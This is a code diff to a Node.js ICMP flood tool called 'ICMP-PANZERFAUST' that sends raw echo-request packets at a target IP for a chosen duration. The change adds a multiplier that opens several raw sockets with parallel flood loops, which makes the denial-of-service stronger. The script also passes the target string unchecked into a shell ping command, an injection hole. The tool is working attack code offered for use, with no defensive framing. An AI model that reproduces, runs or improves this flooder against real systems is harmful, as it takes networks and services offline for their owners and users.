@@ -1,15 +1,17 @@
 const raw = require('raw-socket');
 const { exec } = require('child_process');
 
-if (process.argv.length !== 4) {
-  console.log('Usage: node attack.js <target_ip> <duration_seconds>');
+if (process.argv.length < 4 || process.argv.length > 5) {
+  console.log('Usage: node attack.js <target_ip> <duration_seconds> [multiplier]');
   process.exit(1);
 }
 
 const target = process.argv[2];
 const durationMs = parseInt(process.argv[3], 10) * 1000;
+const multiplier = process.argv[4] ? Math.max(1, parseInt(process.argv[4], 10)) : 1;
 
-const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
+const sockets = [];
+const MAX_INFLIGHT_PER_SOCKET = 1000;
 
 function checksum(buf) {
   let sum = 0;
@@ -24,11 +26,11 @@ function checksum(buf) {
 
 function createICMPPacket(seq) {
   const buf = Buffer.alloc(8);
-  buf.writeUInt8(8, 0); // Type: Echo request
-  buf.writeUInt8(0, 1); // Code
-  buf.writeUInt16BE(0, 2); // Checksum placeholder
-  buf.writeUInt16BE(process.pid & 0xFFFF, 4); // Identifier
-  buf.writeUInt16BE(seq & 0xFFFF, 6); // Sequence number
+  buf.writeUInt8(8, 0);
+  buf.writeUInt8(0, 1);
+  buf.writeUInt16BE(0, 2);
+  buf.writeUInt16BE(process.pid & 0xFFFF, 4);
+  buf.writeUInt16BE(seq & 0xFFFF, 6);
   const csum = checksum(buf);
   buf.writeUInt16BE(csum, 2);
   return buf;
@@ -37,21 +39,15 @@ function createICMPPacket(seq) {
 let sent = 0;
 let success = 0;
 let failed = 0;
-let seq = 0;
 let ppsCounter = 0;
 let maxPPS = 0;
+let lastLatency = 'N/A';
 
 const endTime = Date.now() + durationMs;
 
 function getPingLatency(ip, callback) {
   const platform = process.platform;
-  let cmd = '';
-
-  if (platform === 'win32') {
-    cmd = `ping -n 1 ${ip}`;
-  } else {
-    cmd = `ping -c 1 ${ip}`;
-  }
+  let cmd = platform === 'win32' ? `ping -n 1 ${ip}` : `ping -c 1 ${ip}`;
 
   exec(cmd, (error, stdout) => {
     if (error) {
@@ -60,61 +56,26 @@ function getPingLatency(ip, callback) {
     }
     let timeMatch = null;
     if (platform === 'win32') {
-      timeMatch = stdout.match(/Average = (\d+)ms/);
-      if (!timeMatch) timeMatch = stdout.match(/time=(\d+)ms/);
+      timeMatch = stdout.match(/Average = (\d+)ms/) || stdout.match(/time=(\d+)ms/);
     } else {
       timeMatch = stdout.match(/time=([\d.]+) ms/);
     }
-    if (timeMatch && timeMatch[1]) {
-      callback(timeMatch[1]);
-    } else {
-      callback(null);
-    }
+    callback(timeMatch && timeMatch[1] ? timeMatch[1] : null);
   });
-}
-
-// To avoid flooding memory, limit max concurrent sends inflight
-const MAX_INFLIGHT = 1000;
-let inflight = 0;
-
-function flood() {
-  if (Date.now() >= endTime) {
-    socket.close();
-    liveLog(true);
-    process.exit(0);
-  }
-  while (inflight < MAX_INFLIGHT && Date.now() < endTime) {
-    const packet = createICMPPacket(seq++);
-    inflight++;
-    socket.send(packet, 0, packet.length, target, (err) => {
-      sent++;
-      ppsCounter++;
-      inflight--;
-      if (err) failed++;
-      else success++;
-    });
-  }
-  // Use setImmediate to avoid blocking event loop
-  setImmediate(flood);
 }
 
 function clearConsoleLines(n) {
   for (let i = 0; i < n; i++) {
-    process.stdout.write('\x1b[1A'); // Move cursor up
-    process.stdout.write('\x1b[2K'); // Clear entire line
+    process.stdout.write('\x1b[1A');
+    process.stdout.write('\x1b[2K');
   }
 }
 
-let lastLogLines = 9;
-let lastLatency = 'N/A';
-
 function liveLog(final = false) {
-  const currentPPS = ppsCounter * 10; // scaled because interval is 100ms
+  const currentPPS = ppsCounter * 10;
   if (currentPPS > maxPPS) maxPPS = currentPPS;
 
-  if (!final) {
-    clearConsoleLines(lastLogLines);
-  }
+  if (!final) clearConsoleLines(9);
 
   process.stdout.write('ICMP-PANZERFAUST\n');
   process.stdout.write('--------------------------------------\n');
@@ -126,6 +87,41 @@ function liveLog(final = false) {
   process.stdout.write('--------------------------------------\n');
 
   ppsCounter = 0;
+
+  if (final) {
+    sockets.forEach(s => s.close());
+    process.exit(0);
+  }
+}
+
+function startFlood(socketIndex) {
+  let inflight = 0;
+  let seq = 0;
+  const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
+  sockets.push(socket);
+
+  function floodLoop() {
+    if (Date.now() >= endTime) {
+      liveLog(true);
+      return;
+    }
+
+    while (inflight < MAX_INFLIGHT_PER_SOCKET && Date.now() < endTime) {
+      const packet = createICMPPacket(seq++);
+      inflight++;
+      socket.send(packet, 0, packet.length, target, (err) => {
+        sent++;
+        ppsCounter++;
+        inflight--;
+        if (err) failed++;
+        else success++;
+      });
+    }
+
+    setImmediate(floodLoop);
+  }
+
+  floodLoop();
 }
 
 function updateLatency() {
@@ -134,11 +130,11 @@ function updateLatency() {
   });
 }
 
-// Initial header
 console.log('ICMP-PANZERFAUST');
 console.log('--------------------------------------');
 console.log(`Target: ${target}`);
 console.log(`Duration: ${durationMs / 1000}s`);
+console.log(`Multiplier: ${multiplier}x`);
 console.log('Starting attack...\n');
 
 liveLog();
@@ -146,4 +142,6 @@ liveLog();
 setInterval(liveLog, 100);
 setInterval(updateLatency, 4000);
 
-flood();
+for (let i = 0; i < multiplier; i++) {
+  startFlood(i);
+}
